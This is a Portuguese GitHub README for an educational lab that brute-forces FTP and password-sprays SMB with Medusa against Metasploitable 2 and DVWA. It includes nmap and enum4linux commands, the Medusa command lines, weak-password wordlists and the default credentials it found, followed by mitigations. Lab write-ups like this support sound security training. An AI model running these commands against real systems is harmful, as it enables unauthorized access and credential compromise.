# Laboratório de Ataques Brute Force com Medusa

## 📌 Descrição

Este projeto demonstra a criação de um laboratório controlado de testes de segurança utilizando Kali Linux, Metasploitable 2, DVWA e Medusa para simular ataques de força bruta em diferentes serviços.

O objetivo do laboratório é compreender o funcionamento de ataques de brute force, password spraying e automação de autenticação em aplicações web vulneráveis, além de apresentar recomendações de mitigação e boas práticas de segurança.

⚠️ Todos os testes foram realizados em ambiente controlado e autorizado para fins exclusivamente educacionais.

---

# 🖥️ Tecnologias Utilizadas

* Kali Linux
* Metasploitable 2
* DVWA (Damn Vulnerable Web Application)
* Medusa
* Nmap
* VirtualBox

---

# 📂 Estrutura do Projeto

```text
medusa-bruteforce-lab/
│
├── README.md
├── wordlists/
│   ├── ftp-users.txt
│   ├── ftp-passwords.txt
│   └── smb-passwords.txt
│
├── screenshots/
│   ├── kali-ip.png
│   ├── metasploitable-ip.png
│   ├── nmap-scan.png
│   ├── ftp-attack.png
│   ├── dvwa-attack.png
│   └── smb-attack.png
│
├── comandos/
│   └── comandos-utilizados.txt
│
└── relatorio/
    └── conclusao.md
```

---

# 🧪 Configuração do Ambiente

## Máquina Atacante

| Sistema    | Função                           |
| ---------- | -------------------------------- |
| Kali Linux | Máquina utilizada para auditoria |

---

## Máquina Vulnerável

| Sistema          | Função                          |
| ---------------- | ------------------------------- |
| Metasploitable 2 | Ambiente vulnerável para testes |

---

# 🌐 Configuração de Rede

As duas máquinas virtuais foram configuradas utilizando rede Host-Only no VirtualBox para permitir comunicação interna isolada.

## Exemplo de Rede

| Máquina          | IP            |
| ---------------- | ------------- |
| Kali Linux       | 192.168.56.10 |
| Metasploitable 2 | 192.168.56.20 |

---

# 🔎 Reconhecimento com Nmap

Foi utilizado o Nmap para identificar serviços ativos na máquina vulnerável.

## Comando utilizado

```bash
nmap -sV 192.168.56.20
```

## Objetivo

Identificar portas abertas e serviços vulneráveis disponíveis para os testes de autenticação.

---

# 🔓 Ataque de Força Bruta em FTP

## Criação das Wordlists

### Usuários

```text
admin
msfadmin
user
ftp
test
```

### Senhas

```text
123456
password
admin
msfadmin
toor
```

---

## Execução do Ataque

```bash
medusa -h 192.168.56.20 -U ftp-users.txt -P ftp-passwords.txt -M ftp
```

---

## Resultado

O teste identificou credenciais válidas utilizando combinações fracas de usuário e senha.

### Exemplo

```text
msfadmin:msfadmin
```

---

# 🌐 Teste em Aplicação Web DVWA

O DVWA foi utilizado para simular autenticação web vulnerável.

## Acesso

```text
http://192.168.56.20/dvwa
```

---

## Login padrão

```text
Usuário: admin
Senha: password
```

---

## Configuração de Segurança

O nível de segurança foi configurado para LOW dentro do DVWA.

---

## Objetivo

Demonstrar os riscos de autenticações fracas em aplicações web vulneráveis.

---

# 🖧 Password Spraying em SMB

## Enumeração de Usuários

```bash
enum4linux 192.168.56.20
```

---

## Teste de Password Spraying

```bash
medusa -h 192.168.56.20 -U ftp-users.txt -p password -M smbnt
```

---

# 📖 Conceitos Aplicados

## Brute Force

Ataque baseado em múltiplas tentativas de autenticação utilizando listas de usuários e senhas.

---

## Password Spraying

Técnica que utiliza uma senha comum contra diversos usuários para evitar bloqueios de conta.

---

## Enumeração

Processo de identificação de serviços, usuários e informações disponíveis no alvo.

---

# 🛡️ Medidas de Mitigação

## FTP

* Utilização de SFTP
* Políticas de senha forte
* MFA
* Fail2Ban
* Bloqueio por tentativas

---

## SMB

* Desativação do SMBv1
* Controle de tentativas
* Segmentação de rede
* Monitoramento de logs

---

## Aplicações Web

* CAPTCHA
* Rate Limiting
* MFA
* WAF
* Políticas de senha forte

---

# 📸 Evidências

As evidências visuais poderão ser adicionadas futuramente conforme evolução do laboratório.

```text
/screenshots
```

---

# 📚 Aprendizados

Durante o desenvolvimento deste laboratório foi possível compreender:

* funcionamento de ataques de força bruta;
* importância de políticas de senha;
* riscos de serviços vulneráveis;
* utilização do Medusa em auditorias controladas;
* reconhecimento de serviços com Nmap;
* técnicas de enumeração em ambientes SMB.

---

# ✅ Conclusão

Este laboratório permitiu simular ataques de autenticação em ambiente controlado, demonstrando como credenciais fracas podem comprometer serviços de rede e aplicações web.

Além da exploração prática, o projeto reforçou a importância de mecanismos de proteção como MFA, políticas de senha forte, limitação de tentativas e monitoramento contínuo de autenticações.

O projeto também contribuiu para o desenvolvimento de habilidades em documentação técnica, organização de evidências e utilização do GitHub como portfólio profissional.

---

# ⚠️ Aviso Ético

Este projeto possui finalidade exclusivamente educacional e todos os testes foram realizados em ambiente controlado e autorizado.
